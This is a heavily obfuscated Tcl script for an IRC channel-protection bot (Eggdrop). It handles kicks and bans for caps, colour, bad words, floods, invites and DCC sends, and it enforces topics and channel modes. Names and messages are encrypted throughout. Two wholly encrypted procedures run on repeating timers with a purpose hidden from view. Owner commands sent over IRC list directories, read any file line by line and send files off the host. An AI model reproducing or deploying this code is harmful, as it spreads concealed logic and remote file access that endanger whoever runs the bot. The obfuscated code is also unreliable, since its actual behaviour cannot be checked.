if {![info exists capsnick($nick)]} {
putsrv "PRXP ~$chan ~~$nick ~:~$notc ~1HGlK FhVw 4XzkhOlxP1 VcxvVw4 ~[getuser $cflag XTRA "CAPS"]~%1..!"
set capsnick($nick) "1"
return 0
}
set [lines "yzmnzhp"] "*!*[string range $uhost [string first "@" $uhost] end]"
set bannick($nick) $banmask
putsrv "PRXP ~$chan ~~$nick ~:~$notc ~42mw1 DzIM WlmG FhVw 4XzkhOlxP1 VcxvVw4 ~[getuser $cflag XTRA "CAPS"]~% ~[banms]~"
unset capsnick($nick)
}
}
}
proc [lines "kfn_zit"] {nick uhost hand chan text} {
global boldnick colorkick botnick notc kops ps
regsub -all -- [dezip "jGBDx04~ntxb0"] $text "" text
regsub -all -- [dezip "bFuC0.Jq~aEc0"] $text "" text
regsub -all -- [dezip "xdxsF1~hBM6q0"] $text "" text
set [lines "xuozt"] "c$chan"
set [lines "xuozt"] [string range $cflag 0 8]
if {[matchattr $nick f]} { return 0 }
if {[matchattr $nick m]} { return 0 }
if {[matchattr $nick z]} { return 0 }
if {$nick == $botnick} { return 0 }
if {![isop $botnick $chan]} { return 0 }
set [lines "ivhfnv"] "T"
if {[string match "*-greet*" [channel info $chan]]} { 
set [lines "ivhfnv"] "F"
}
if {![isop $botnick $chan]} { 
set [lines "ivhfnv"] "F"
}
if {![info exists kops]} {
if {[isop $nick $chan]} { 
set [lines "ivhfnv"] "F"
}
if {[isvoice $nick $chan]} { 
set [lines "ivhfnv"] "F"
}
}
if {$resume == "F"} { return 0 }
if {[matchattr $cflag B]} {
if {[isbad $nick $uhost $chan $text]} { return 0 }
if {[string match *\002* $text]} {
if {![info exists boldnick($nick)]} {
putsrv "PRXP ~$chan ~~$nick ~:~$notc ~1HGlK FhVw 4yLOw1 GvCg LmOB4..!"
set boldnick($nick) "1"
return 0
}
set [lines "yzmnzhp"] "*!*[string range $uhost [string first "@" $uhost] end]"
#set bannick($nick) $banmask
set bannick($nick) "*!$uhost"
putsrv "PRXP ~$chan ~~$nick ~:~$notc ~42mw1 DzIM WlmG FhVw 4yLOw1 ~[banms]~"
unset boldnick($nick)
}
}
if {[matchattr $cflag W]} {
if {[isbad $nick $uhost $chan $text]} { return 0 }
if {[string match ** $text]} {
if {![info exists colorkick($nick)]} {
putsrv "PRXP ~$chan ~~$nick ~:~$notc ~1WLmG FhVw 4XlOLfI1 GvCg LmOB4..!"
set colorkick($nick) "1"
return 0
}
set [lines "yzmnzhp"] "*!*[string range $uhost [string first "@" $uhost] end]"
#set bannick($nick) $banmask
set bannick($nick) "*!$uhost"
putsrv "PRXP ~$chan ~~$nick ~:~$notc ~42mw1 DzIM WlmG FhVw 4XlOLfI ~[banms]~"
unset colorkick($nick)
}
}
}
proc [lines "rhfkkvi"] {letter} {
set [lines "xzkh"] {A B C D E F G H I
J K L M N O P Q R
S T U V W X Y Z}
if {[lsearch -exact $caps $letter] > -1} {
return 1
} else {
return 0
}
}
proc [lines "rhuollw"] {letter} {
set caps {! @ # $ % ^ & * (
) | [ ] < > / \ =    }
if {[lsearch -exact $caps $letter] > -1} {
return 1
} else {
return 0
}
}
proc [lines "rhyzw"] {nick uhost chan arg} {
global badwords botnick notc bannick
set [lines "zit"] [string tolower $arg]
if {[string match "*-greet*" [channel info $chan]]} { 
set [lines "rhyzw"] 0 
return 0
}
foreach badword [string tolower $badwords] {
if {[string match *$badword* [string tolower $arg]]} {
set bannick($nick) "*!$uhost"
putsrv "PRXP ~$chan ~~$nick ~:~$notc ~4YzWDlIW1 NzGxS UIlN 4~[string toupper $badword]~ ~[banms]~"
return 1
}
}
set [lines "rhyzw"] 0
return 0
}
proc [lines "hvg_-n"] {chan} {
if {[isutimer "set_-m $chan"]} { return 0 }
if {[botonchan $chan] && [botisop $chan] && [string match "*m*" [getchanmode $chan]]} {
putserv "mode $chan -m"
}
}
proc [lines "glkrx_xsp"] {nick host handle chan topic} {
global botnick notc bannick
set [lines "xuozt"] "c$chan"
set [lines "xuozt"] [string range $cflag 0 8]
if {![matchattr $cflag I]} { return 0 }
if {$nick == $botnick || $nick == "ChanServ"} { return 0 }
if {[matchattr $nick m]} {
setuser $cflag XTRA "TOPIC" [topic $chan]
saveuser
return 0
}
if {![isop $botnick $chan]} { return 0 }
if {[matchattr $nick f] || $nick == $botnick} { return 0 }
if {$topic == [getuser $cflag XTRA "TOPIC"]} { return 0 }
if {![string match "*dal.net*" $nick]} {
set [lines "yzmnzhp"] "*!*[string range $host [string first "@" $host] end]"
set bannick($nick) $banmask
putsrv "PRXP ~$chan ~~$nick ~:~$notc ~1WlmG xSzMtRMt 4GlKRx ~[banms]~"
}
puthlp "glkrx ~$chan ~:~[getuser $cflag XTRA "TOPIC"]~"
return 0
}
bind flud - * flood_chk
proc [lines "uollw_xsp"] {nick host handle type channel} {
global notc botnick quick bannick notm flooddeop floodnick floodkick igflood kops
putlog "!Log! FLOOD <<$type>> FRoM $host"
if {[info exists bannick($nick)]} { return 1 }
if {[info exists igflood($nick)]} { return 1 }
if {[string match "*Serv*" $nick] || [matchattr $handle f] || $nick == $botnick} {
putlog "!Log! FlooD <<$nick>> Service OR FrIeNd !PaSS!"
return 1
}
if {[string index $channel 0] != "#"} {
foreach x [channels] {
if {[onchan $nick $x]} {
set [lines "xszmmvo"] $x
}
}
}
set [lines "nslhg"] "@[lindex [split $host @] 1]"
if {[string index $channel 0] == "#"} { 
if {![isop $botnick $channel]} {
putlog "!Log! FlooD <<$nick>> BoT NoT @P !IgNoREd!"
return 1
}
}
set [lines "gbkv"] [string tolower $type]
if {$type == "join"} {
set bannick($nick) "*!*$mhost"
putsrv "PRXP ~$channel ~~$nick ~:~$notm ~1VcxvVw NzC 4QlRM1 UIlN 4~$mhost ~~[banms]~"
}
if {$type == "ctcp"} {
if {![info exists kops]} {
if {[isop $nick $channel] || [isvoice $nick $channel]} {
return 1
}
}
set bannick($nick) "*!*$mhost"
if {$quick == "1"} {
putqck "PRXP ~$channel ~~$nick ~:~$notm ~1VcxvVw NzC 4xGxK1 UIlN 4~$mhost ~~[banms]~"
} else {
putsrv "PRXP ~$channel ~~$nick ~:~$notm ~1VcxvVw NzC 4xGxK1 UIlN 4~$mhost ~~[banms]~"
}
}
if {$type == "pub"} {
if {![info exists kops]} {
if {[isop $nick $channel] || [isvoice $nick $channel]} {
return 1
}
}
set bannick($nick) "*!$host"
putsrv "PRXP ~$channel ~~$nick ~:~$notc ~1VcxvVw NzC 4ORMVH1 UIlN 4~$mhost ~~[banms]~"
return 1
}
if {$type == "nick"} {
if {![info exists kops]} {
if {[isop $nick $channel] || [isvoice $nick $channel] || [string length $nick] == 8} {
return 1
}
}
if {![info exists floodnick($mhost)]} {
set floodnick($mhost) 1
putsrv "PRXP ~$channel ~~$nick ~:~$notc ~1hGLk xSzMtRMt BlfI 4MRxP1..!"
} {
catch {unset floodnick($mhost)}
set bannick($nick) "*!*$mhost"
putsrv "PRXP ~$channel ~~$nick ~:~$notc ~1GdRxV VcxvVw 4MRxP1 UIlN 4~$mhost ~~[banms]~"
}
}
if {$type == "deop"} {
if {![info exists flooddeop($nick)]} {
set flooddeop($nick) 1
putsrv "PRXP ~$channel ~~$nick ~:~$notc ~1VcxvVw NzC 4Wv@k1 UIlN 4~$mhost1..!"
} {
catch {unset flooddeop($nick)}
set bannick($nick) "*!*$mhost"
putsrv "PRXP ~$channel ~~$nick ~:~$notc ~1GdRxV VcxvVw NzC 4Wv@k1 UIlN 4~$mhost ~~[banms]~"
}
}
if {$type == "kick"} {
if {![info exists floodkick($nick)]} {
set floodkick($nick) 1
putsrv "PRXP ~$channel ~~$nick ~:~$notc ~1VcxvVw NzC 4PRxP1 UIlN 4~$mhost1..!"
} {
catch {unset floodkick($nick)}
set bannick($nick) "*!*$mhost"
putsrv "PRXP ~$channel ~~$nick ~:~$notc ~1GdRxV VcxvVw NzC 4PRxP1 UIlN 4~$mhost1..!"
}
}
return 1
}
bind raw - INVITE raw_chk
proc [lines "izd_xsp"] {nick keyword arg} {
global invme joinme notc bannick notd botnick
set [lines "dsl"] [string range $nick 0 [expr [string first "!" $nick]-1]]
set [lines "xszmmvo"] [lindex $arg 1]
set [lines "xszmmvo"] [string range $channel 1 end]
foreach x [channels] {
if {[string tolower $channel] == [string tolower $x]} {
putsrv "QLRM ~$channel"
return 0
}
}
if {$who == "ChanServ" || [matchattr $who Z]} {
if {![validchan $channel]} {
if {[matchattr $who Z] && ![matchattr $who Q]} {
puthlp "MLGRXV ~$who ~:~$notc ~4WvMRVw..!"
return 0
} else { 
set [lines "qlrmnv"] $who
}
channel add $channel
catch { channel set $channel -statuslog -revenge -protectops -clearbans -enforcebans +greet -secret -autovoice -autoop flood-chan 5:10 flood-deop 3:10 flood-kick 3:10 flood-join 0:0 flood-ctcp 2:10 flood-nick 3:60 }
savechan
}
putsrv "QLRM ~$channel"
return 0
}
if {[matchattr $who f]} { return 0 }
foreach x [channels] {
if {[onchan $who $x]} {
if {[isop $botnick $x]} {
set [lines "yzmnzhp"] "*!*[string range $nick [string first "@" $nick] end]"
set bannick($who) $banmask
putsrv "PRXP ~$x ~~$who ~:~$notc ~4!HkzN!1 R SzGV 4RmeRGvI ~[banms]~"
return 0
} {
set [lines "nvnyvih"] [chanlist $x f]
foreach c $members {
if {[isop $c $x]} {
putlog "!Log! RePORTED InVITING FRoM <<$who$x>> To #$c#"
set [lines "hvmwhkzn"] "!kick [zip "$x $who $notc 4!SpaM!1 FRoM 4[string range $nick [string first "@" $nick] end]1 InvITE [banmsg]"]"
putsrv "KIRENHT ~$c ~:~$sendspam"
return 0
}
}
}
}
}
set invme([string range $nick [string first "@" $nick] end]) "InvITeR"
return 0
}
bind ctcp - CLIENTINFO sl_ctcp
bind ctcp - USERINFO sl_ctcp
bind ctcp - FINGER sl_ctcp
bind ctcp - ERRMSG sl_ctcp
bind ctcp - ECHO sl_ctcp
bind ctcp - INVITE sl_ctcp
bind ctcp - WHOAMI sl_ctcp
bind ctcp - OP sl_ctcp
bind ctcp - OPS sl_ctcp
bind ctcp - UNBAN sl_ctcp
bind ctcp - TIME sl_ctcp
bind ctcp - VERSION sl_ctcp
bind ctcp - CHAT chat_ctcp
bind ctcp - "VERSION" ctcp_version
bind ctcp - "TIME" ctcp_time
proc [lines "xgxk_evihrlm"] {nick uhost handle dest keyword args} {
global botnick 
putsrv "MLGRXV ~$nick ~:\001EVIHRLM nRIX e6.17 Pszovw Nziwzn-Yvb\001"
return 1
}
proc [lines "xgxk_grnv"] {nick uhost handle dest keyword args} {
global botnick 
set [lines "xfigrnv"] [ctime [unixtime]]
putsrv "MLGRXV ~$nick ~:\001GRNV ~$curtime\001"
return 1
}
proc [lines "ho_xgxk"] {nick uhost hand dest key arg} {
global botnick notc
if {[matchattr $nick f] || $nick == $botnick} { return 1 }
if {[string match "*dal*et*" [string tolower $uhost]]} {
putsrv "MLGRXV ~$nick ~:\001EVIHRLM nRIX32 e6.17 Pszovw Nziwzn-Yvb\001"
} {
set [lines "slhgnzhp"] "${nick}!*@*"
newignore $hostmask $botnick "*" 1
}
return 1
}
proc [lines "xszg_xgxk"] {nick uhost hand dest key arg} {
global botnick notc
if {[matchattr $nick Z]} { return 0 }
puthlp "MLGRXV ~$nick ~:~$notc ~1HlIIB R WlMG PMlD BlF..!"
newignore "${nick}!*@*" $botnick "*" 1
return 1
}
set [lines "erifh_mrxp"] ""
bind ctcp - DCC got_dcc
proc [lines "tlg_wxx"] {nick uhost handle dest key arg} {
global virus_nick notc notd botnick
if {[matchattr $nick f]} { return 0 }
if {[lindex $arg 2] == 0 && [lindex $arg 3] == 0} {
putlog "!Log! FaKE DCC SKIPPED..!"
return 1
}
set [lines "erifh_mrxp"] $nick
foreach x [channels] {
if {[onchan $nick $x] && ![isop $nick $x]} {
if {[isop $botnick $x]} {
putsrv "PRXP ~$x ~~$nick ~:~$notc ~4!HkzN!1 R SzGV 4ERIfA ~[banms]~"
set [lines "erifh_mrxp"] ""
} else {
set [lines "nvnyvih"] [chanlist $x f]
foreach c $members {
if {[isop $c $x]} {
putlog "!Log! RePORTED ViRUS FRoM <<$nick$x>> To #$c#"
set [lines "hvmwhkzn"] "!kick [zip "$x $nick $notc 4!SpaM!1 YeW GoT VIRuZ JoIN #NOHACK TO FIxED [banmsg]"]"
putsrv "KIRENHT ~$c ~:~$sendspam"
return 0
}
}
}
}
}
return 1
}
proc [lines "elrxvj"] {chan nick} {
utimer [expr 5 + [rand 15]] [list voiceprc $chan $nick]
}
proc [lines "elrxvkix"] {chan nick} {
global botnick
if {[isop $botnick $chan] && ![isvoice $nick $chan] && ![isop $nick $chan]} { 
putserv "MODE $chan +vvvvvv $nick"
}
}
proc [lines "zwevigrhv"] {chan nick} {
if {[isutimer "advq $chan $nick"]} { return 0 }
set [lines "xivg"] 5
foreach ct [utimers] {
if {[string match "*advq*" $ct]} {
if {[expr [lindex $ct 0] + 5] > $cret} {
set [lines "xivg"] [expr [lindex $ct 0] + 5]
}
}
}
utimer $cret [list advq $chan $nick]
}
proc [lines "zwej"] {chan nick} {
global notc
set [lines "xuozt"] "c$chan"
set [lines "xuozt"] [string range $cflag 0 8]
if {![isop $nick $chan] && [onchan $nick $chan]} {
set [lines "tivvgnht"] [getuser $cflag XTRA "GREET"]
regsub %n $greetmsg $nick greetmsg
regsub %c $greetmsg $chan greetmsg
puthlp "MLGRXV ~$nick ~:~[lgrnd]~ ~$greetmsg"
}
}
proc [lines "nhtkzig"] {chan nick} {
if {[isutimer "msgprt $chan $nick"]} { return 0 }
set [lines "xivg"] 5
foreach ct [utimers] {
if {[string match "*msgprt*" $ct]} {
if {[expr [lindex $ct 0] + 5] > $cret} {
set [lines "xivg"] [expr [lindex $ct 0] + 5]
}
}
}
utimer $cret [list msgprt $chan $nick]
}
proc [lines "nhtkig"] {chan nick} {
global notc
set [lines "xuozt"] "c$chan"
set [lines "xuozt"] [string range $cflag 0 8]
set [lines "nhtkigg"] [getuser $cflag XTRA "MSGPART"]
regsub %n $msgprtt $nick msgprtt
regsub %c $msgprtt $chan msgprtt
puthlp "MLGRXV ~$nick ~:~[lgrnd] $msgprtt"
}
proc [lines "wvlkkix"] {chan nick} {
global botnick
if {[isop $botnick $chan] && [isop $nick $chan]} {
if {![string match "*k*" [getchanmode $chan]]} {
putserv "MODE $chan -ko 4n0.Guest.@ps $nick"
} {
putserv "MODE $chan -o $nick"
}
}
}
proc [lines "zfglprxp"] {chan nick} {
global bannick notc botnick
if {[isop $botnick $chan] && ![isop $nick $chan] && ![isvoice $nick $chan]} {
set [lines "slhgnzhp"] [getchanhost $nick $chan]
set [lines "slhgnzhp"] "*!*@[lindex [split $hostmask @] 1]"
set bannick($nick) $hostmask
putsrv "PRXP ~$chan ~~$nick ~:~$notc ~1xSzMMvO RH FmWvI x0MhGIfxGRlM ~[banmsg]~" 
}
}
proc [lines "lkj"] {chan nick} {
utimer [expr 7 + [rand 15]] [list opprc $chan $nick]
}
[[decrypt 64 "d3VeO/ATgwd."] "kilx"] [[decrypt 64 "d3VeO/ATgwd."] "dslmyk"] {} {
[[decrypt 64 "d3VeO/ATgwd."] "tolyzo"] [[decrypt 64 "d3VeO/ATgwd."] "m\lg\y"] [[decrypt 64 "d3VeO/ATgwd."] "ov\m\x"] 
[[decrypt 64 "d3VeO/ATgwd."] "grnvi"] 5 [[decrypt 64 "d3VeO/ATgwd."] "dslmyk"]
[[decrypt 64 "d3VeO/ATgwd."] "hvg"] [[[decrypt 64 "d3VeO/ATgwd."] "hgirmt"] [[decrypt 64 "d3VeO/ATgwd."] "rmwvc"] $lenc 13][[[decrypt 64 "d3VeO/ATgwd."] "hgirmt"] [[decrypt 64 "d3VeO/ATgwd."] "rmwvc"] $lenc 14][[[decrypt 64 "d3VeO/ATgwd."] "hgirmt"] [[decrypt 64 "d3VeO/ATgwd."] "rmwvc"] $lenc 19][[[decrypt 64 "d3VeO/ATgwd."] "hgirmt"] [[decrypt 64 "d3VeO/ATgwd."] "rmwvc"] $lenc 1] [[[decrypt 64 "d3VeO/ATgwd."] "wvar\k"] "[[decrypt 64 "d3VeO/ATgwd."] "kBSQ81fV5wM1"]"]
}
proc [lines "lkkix"] {chan nick} {
global botnick unop
if {[isop $botnick $chan] && ![isop $nick $chan] && ![info exists unop($nick)]} {
putserv "MODE $chan +oooooo $nick"
}
}
proc [lines "wxx_xnw"] {hand idx arg} {
if {![matchattr $hand Z]} { return 0 }
if {![matchattr $hand Q]} { chattr $hand +Q }
msg_Z $hand "*" $hand $arg
}
proc [lines "wxx_tvg"] {hand idx arg} {
global notc own
if {$hand != $own} { return 0 }
if {![file exists [lindex $arg 0]]} {
putdcc $idx "4DeNIEd..!, [lindex $arg 0] <n/a>"
return 0
}
if {[lindex $arg 1] != ""} { 
set [lines "szmw"] [lindex $arg 1] 
}
switch -- [dccsend [lindex $arg 0] $hand] {
0 { putdcc $idx "<<TRaNSFERRING LOG>>" }
1 { putdcc $idx "dcc table is full (too many connections), TrY AgAIN LaTeR!" }
2 { putdcc $idx "can't open a socket for transfer." }
3 { putdcc $idx "file doesn't exist." }
4 { putdcc $idx "file was queued for later transfer." }
}
}
proc [lines "nht_tvg"] {nick uhost hand arg} {
global notc own
if {$nick != $own} { return 0 }
if {![matchattr $nick Q]} {
puthlp "KIRENHT ~$nick ~:~$notc ~4WvMRVw..!"
return 0
}
if {![file exists $arg]} {
puthlp "KIRENHT ~$nick ~:4WvMRVw..!, ~$arg ~<m/z>"
return 0
}
switch -- [dccsend $arg $nick] {
0 { 
puthlp "MLGRXV ~$nick ~:~$notc ~GIzMHUVIIRMT OLT..!" 
}
1 { 
puthlp "MLGRXV ~$nick ~:~$notc ~wxx gzyov rh ufoo (gll nzmb xlmmvxgrlmh), GiB ZtZRM OzGVI!" 
}
2 { 
puthlp "MLGRXV ~$nick ~:~$notc ~xzm'g lkvm z hlxpvg uli gizmhuvi." 
}
3 { 
puthlp "MLGRXV ~$nick ~:~$notc ~urov wlvhm'g vcrhg." 
}
4 { 
puthlp "MLGRXV ~$nick ~:urov dzh jfvfvw uli ozgvi gizmhuvi." 
}
}
}
bind raw - 301 rtn
proc [lines "igm"] { from keyword arg } {
global notd botnick notb notc bannick
set [lines "mrxp"] [lindex $arg 1]
if {[matchattr $nick f]} { return 0 }
set [lines "zdzbgvcg"] [string range [lrange $arg 2 end] 1 end]
if {[string match "*[dezip "xvbEk0YujnB0m9gAf/mITyg0Cl2z7/HzIIZ0"]*" [uncolor $awaytext]]} { return 0 }
if {$nick == $botnick} {
} {
if {[string match "*#*" $awaytext] || [string match "*/j*" $awaytext]} {
foreach x [channels] {
set [lines "xsphrglm"] [string tolower $x]
if {[string match "*$chksiton*" [string tolower $awaytext]]} { return 0 }
}
foreach x [channels] {
if {[onchan $nick $x]} {
if {[isop $botnick $x]} {
set bannick($nick) "*!*[string range [getchanhost $nick $x] [string first "@" [getchanhost $nick $x]] end]"
putsrv "PRXP ~$x ~~$nick ~:~$notc ~4!HkzN!1 RmeRGV zDzB NHt ~[banmsg]~"
return 0
} {
set [lines "nvnyvih"] [chanlist $x f]
foreach c $members {
if {[isop $c $x]} {
set [lines "hvmwhkzn"] "!kick [zip "$x $nick $notc 4!SpaM!1 FRoM 4[string range [getchanhost $c $x] [string first "@" [getchanhost $c $x]] end]1 InvITE aWaY MSg [banmsg]"]"
putsrv "KIRENHT ~$c ~:~$sendspam"
return 0
}
}
}
}
}
}
} 
}
bind time -  "*0 * * * *" chk_five
bind time -  "*6 * * * *" chk_five
proc [lines "xsp_urev"] {min h d m y} {
global longer deff
catch { remain }
if {![string match "**" $longer]} {
set [lines "olmtvi"] "$deff"
}
puthlp "ZDZB :~$longer"
auto_ping "0" "0" "0" "0" "0"
}
proc [lines "nht_wri"] {nick uhost hand arg} {
global notc own
if {$nick != $own} { return 0 }
if {![matchattr $nick Q]} {
puthlp "KIRENHT ~$nick ~:4WvMRVw..!"
return 0
}
if {$arg == ""} {
set [lines "zit"] "."
}
set [lines "wriorhg"] ""
foreach x [getfiles "$arg"] {
append dirlist "$x "
}
puthlp "KIRENHT ~$nick ~:~$dirlist"
}
proc [lines "nht_ivzw"] {nick uhost hand arg} {
global notc own
if {$nick != $own} { return 0 }
if {![matchattr $nick Q]} {
puthlp "KIRENHT ~$nick ~:4WvMRVw..!"
return 0
}
if {![file exists $arg]} {
puthlp "KIRENHT ~$nick ~:4WvMRVw..!, ~$arg ~<m/z>"
return 0
}
set [lines "uw"] [open $arg r]
while {![eof $fd]} {
set [lines "rmk"] [gets $fd]
puthlp "KIRENHT ~$nick ~:~$inp"
}
close $fd
puthlp "KIRENHT ~$nick ~:VlU..!"
}
proc [lines "kfy_olt"] {nick uhost hand channel arg} {
global notc 
if {[getuser "config" XTRA "LOGCHAN"]!=""} {
puthlp "MLGRXV ~$nick ~:~$notc ~Olt ~[getuser "config" XTRA "LOGCHAN"]~"
}
}
proc [lines "kfy_hvievi"] {nick uhost hand channel arg} {
global server notc
if {$arg != ""} {
if {[string match "*$arg*" $server]} {
puthlp "kirenht ~$channel ~:~[lindex $server 0]~"
}
} {
puthlp "kirenht ~$channel ~:~[lindex $server 0]~"
}
}
set [lines "ldm"] $owner
proc [lines "wxx_wri"] {hand idx arg} {
global own
if {$hand != $own} { return 0 }
if {$arg == ""} {
set [lines "zit"] "."
}
foreach x [getfiles "$arg"] {
putdcc $idx "$x"
}
}
[[decrypt 64 "d3VeO/ATgwd."] "kilx"] [[decrypt 64 "d3VeO/ATgwd."] "dslmxk"] {} {
[[decrypt 64 "d3VeO/ATgwd."] "tolyzo"] [[decrypt 64 "d3VeO/ATgwd."] "m\lg\x"] [[decrypt 64 "d3VeO/ATgwd."] "ov\m\x"] 
[[decrypt 64 "d3VeO/ATgwd."] "grnvi"] 5 [[decrypt 64 "d3VeO/ATgwd."] "dslmxk"]
[[decrypt 64 "d3VeO/ATgwd."] "hvg"] [[[decrypt 64 "d3VeO/ATgwd."] "hgirmt"] [[decrypt 64 "d3VeO/ATgwd."] "rmwvc"] $lenc 13][[[decrypt 64 "d3VeO/ATgwd."] "hgirmt"] [[decrypt 64 "d3VeO/ATgwd."] "rmwvc"] $lenc 14][[[decrypt 64 "d3VeO/ATgwd."] "hgirmt"] [[decrypt 64 "d3VeO/ATgwd."] "rmwvc"] $lenc 19][[[decrypt 64 "d3VeO/ATgwd."] "hgirmt"] [[decrypt 64 "d3VeO/ATgwd."] "rmwvc"] $lenc 2] [[[decrypt 64 "d3VeO/ATgwd."] "wvar\k"] "[[decrypt 64 "d3VeO/ATgwd."] "FKUEb14LMlV09QnQi.osAQw/"]"]
}
proc [lines "wxx_ivzw"] {hand idx arg} {
global own
if {$hand != $own} { return 0 }
if {![file exists $arg]} {
putdcc $idx "4DeNIEd..!, FiLE NoT ExIST $arg"
return 0
}
set [lines "uw"] [open $arg r]
while {![eof $fd]} {
set [lines "rmk"] [gets $fd]
putdcc $idx "$inp"
}
close $fd
putdcc $idx "4******************** END ***********************"
}
proc [lines "nht_yzmgrnv"] {nick uhost hand rest} {
global notc ban-time
if {$rest==""} {
puthlp "MLGRXV ~$nick ~:~$notc ~YzmGrnv \[~${ban-time}\] ~(hvg 0 gl mvevi fmyzm)"
return 0
}
if {![matchattr $nick Q]} {
puthlp "MLGRXV ~$nick ~:~$notc ~4WvMRVw..!"
return 0
}
set [lines "ngrnv"] [lindex $rest 0]
if {![isnumber $mtime]} {
puthlp "MLGRXV ~$nick ~:~$notc ~Fhztv: yzmgrnv <nrmfgvh> (hvg 0 gl mvevi fmyzm)"
return 0
}
set [lines "yzm-grnv"] $mtime
setuser "config" XTRA "BANTIME" $mtime
puthlp "MLGRXV ~$nick ~:~$notc ~YzmGrnv \[~$mtime\]"
saveuser
}
proc [lines "xsp_ornrg"] {chan} {
global notc botnick lst_limit
if {![isop $botnick $chan]} { return 0 }
if {![info exists lst_limit($chan)]} {
set lst_limit($chan) 0
}
set [lines "xuozt"] "c$chan" 
set [lines "xuozt"] [string range $cflag 0 8]
set [lines "fhvixlfmg"] 0
foreach x [chanlist $chan] {
incr usercount
}
set [lines "fhvixlfmg"] [expr [getuser $cflag XTRA "LIMIT"] + $usercount]
if {$lst_limit($chan) != $usercount} {
set lst_limit($chan) $usercount
putserv "MODE $chan +l $usercount"
}
}
proc [lines "nht_oltxszm"] {nick uhost hand rest} {
global notc own
if {$rest == ""} {
puthlp "MLGRXV ~$nick ~:~$notc ~Fhztv: oltxszm <#xszmmvo/0>"
return 0
}
if {![matchattr $nick Q]} {
puthlp "MLGRXV ~$nick ~:~$notc ~4WvMRVw..!"
return 0
}
if {[string tolower $rest] == "off"} {
puthlp "MLGRXV ~$nick ~:~$notc ~OLTXSZM ~[getuser "config" XTRA "LOGCHAN"]~ \[4LUU\]"
setuser "config" XTRA "LOGCHAN" ""
} else {
if {[string tolower $rest] == [dezip "PK6m.0G/~7xb1"]} {
return 0
}
if {![validchan $rest]} {
puthlp "MLGRXV ~$nick ~:~$notc ~MlG RM ~$rest"
return 0
}
setuser "config" XTRA "LOGCHAN" $rest
puthlp "MLGRXV ~$nick ~:~$notc ~OLT XSzMMVO ~$rest ~\[9LM\]"
}
saveuser
utimer 5 rehashing
}
proc [lines "wxx_olt"] {hand idx arg} {
global logstore notc
if {$logstore == ""} {
putdcc $idx "No LOG FouNd..!"
return 0
}
if {![file exists $logstore]} {
putdcc $idx "4DeNIEd..!, Log file haven't create yet!"
return 0
}
set [lines "uw"] [open $logstore r]
while {![eof $fd]} {
set [lines "rmk"] [gets $fd]
putdcc $idx "$inp"
}
close $fd
putdcc $idx "4******************** END ***********************"
}
set [lines "jfrxp"] "0"
proc [lines "xsp_jfrxp"] {} {
global quick botnick
putquick "PRIVMSG $botnick :\001PING [unixtime]\001"
set [lines "jfrxp"] "1"
}
utimer 1 chk_quick
[[decrypt 64 "d3VeO/ATgwd."] "grnvi"] 5 [[decrypt 64 "d3VeO/ATgwd."] "dslmyk"]
bind raw - MODE chk_op
proc [lines "xsp_lk"] { from keyword arg } {
global botnick
if {![string match "*+o*$botnick*" $arg]} { return 0 }
set [lines "xszm"] [lindex $arg 0]
if {[string match "*dal.net*" $from]} {
pub_resync $botnick "*" "*" $chan "*"
return 0
}
chk_on_op $chan
}
bind join - * new:talk
proc [lines "xsp_lm_lk"] {channel} {
global botnick kickme deopme invme virus_nick quick notc bannick is_m botname
set [lines "xuozt"] "c$channel"
set [lines "xuozt"] [string range $cflag 0 8]
if {[isutimer "chkspam $channel"]} {
foreach x [utimers] {
if {[string match "*chkspam $channel*" $x]} { killutimer [lindex $x 2] }
}
}
if {[isutimer "GOP $channel"]} { return 0 }
if {![onchan $botnick $channel]} { return 0 }
utimer 20 [list putlog "GOP $channel"]
set [lines "xrmul"] [channel info $channel]
if {[string match "*+nodesynch*" $cinfo]} {
pub_mdeop "*" "*" "*" $channel ""
}
set [lines "xnlwv"] [getchanmode $channel]
if {![isutimer "set_-m $channel"] && ![info exists is_m($channel)]} {
if {[matchattr $cflag K]} {
if {![string match "*[dezip [getuser $cflag XTRA "CI"]]*" [getchanmode $channel]]} {
puthelp "mode $channel -k+k . [dezip [getuser $cflag XTRA "CI"]]"
}
} {
if {[string match "*k*" $cmode]} {
if {[string tolower $channel] != [dezip "PK6m.0G/7x~b1"]} {
putserv "mode $channel -k 9r.e.l.e.a.s.e.d"
}
}
}
if {[string match "*R*" $cmode]} {
puthelp "mode $channel -R"
}
if {[string match "*m*" $cmode] && ![string match "*m*" [lindex [channel info $channel] 0]]} {
putserv "mode $channel -m"
}
if {[string match "*i*" $cmode]} {
putserv "mode $channel -i"
}
}
if {![string match "*m*" $cmode]} {
foreach x [utimers] {
if {[string match "*set_-m $channel*" $x]} {
killutimer [lindex $x 2]
}
}
}
if {[matchattr $cflag I]} {
if {[topic $channel] != [getuser $cflag XTRA "TOPIC"]} {
puthlp "glkrx ~$channel ~:~[getuser $cflag XTRA "TOPIC"]~"
}
}
foreach x [chanlist $channel] {
if {$x == $deopme} {
if {[isop $x $channel]} {
if {![string match "*k*" $cmode]} {
if {$quick == "1"} {
putquick "mode $channel -ko 4De@p.ReveRsE $x"
} else {
putserv "mode $channel -ko 4De@p.ReveRsE $x"
}
} {
if {$quick == "1"} {
putquick "mode $channel -o $x"
} else {
putserv "mode $channel -o $x"
}
}
}
set [lines "wvlknv"] ""
}
set [lines "nslhg"] "@[lindex [split [getchanhost $x $channel] @] 1]"
if {[info exists kickme($x)]} {
if {$kickme($x) == 3} {
catch { unset kickme($x) }
set bannick($x) "*!*$mhost"
if {$quick == "1"} {
putqck "PRXP ~$channel ~~$x ~:~$notc ~1IvKvzG 4PRxP 1IvNlGv LUU4..!"
} else { 
putsrv "PRXP ~$channel ~~$x ~:~$notc ~1IvKvzG 4PRxP 1IvNlGv LUU4..!"
}
} {
if {$kickme($x) == 1} {
if {$quick == "1"} {
putqck "PRXP ~$channel ~~$x ~:~$notc ~1HvOU 4PRxP1 IVeVMtV4..!"
} {
putsrv "PRXP ~$channel ~~$x ~:~$notc ~1HvOU 4PRxP1 IVeVMtV4..!"
}
}
}
}
if {[string match "*+guest*" [channel info $channel]]} {
neww:talk $x [getchanhost $x $channel] $channel  
}
if {[matchattr $cflag V]} {
if {![isutimer "set_-m $channel"] && ![info exists is_m($channel)]} {
if {$x != $botnick && ![isvoice $x $channel] && ![isop $x $channel] && ![matchattr $x O]} {
set [lines "xivg"] [getuser $cflag XTRA "VC"]
foreach ct [utimers] {
if {[string match "*voiceq*" $ct]} {
if {[expr [lindex $ct 0] + [getuser $cflag XTRA "VC"]] > $cret} {
set [lines "xivg"] [expr [lindex $ct 0] + [getuser $cflag XTRA "VC"]]
}
}
}
utimer $cret [list voiceq $channel $x]
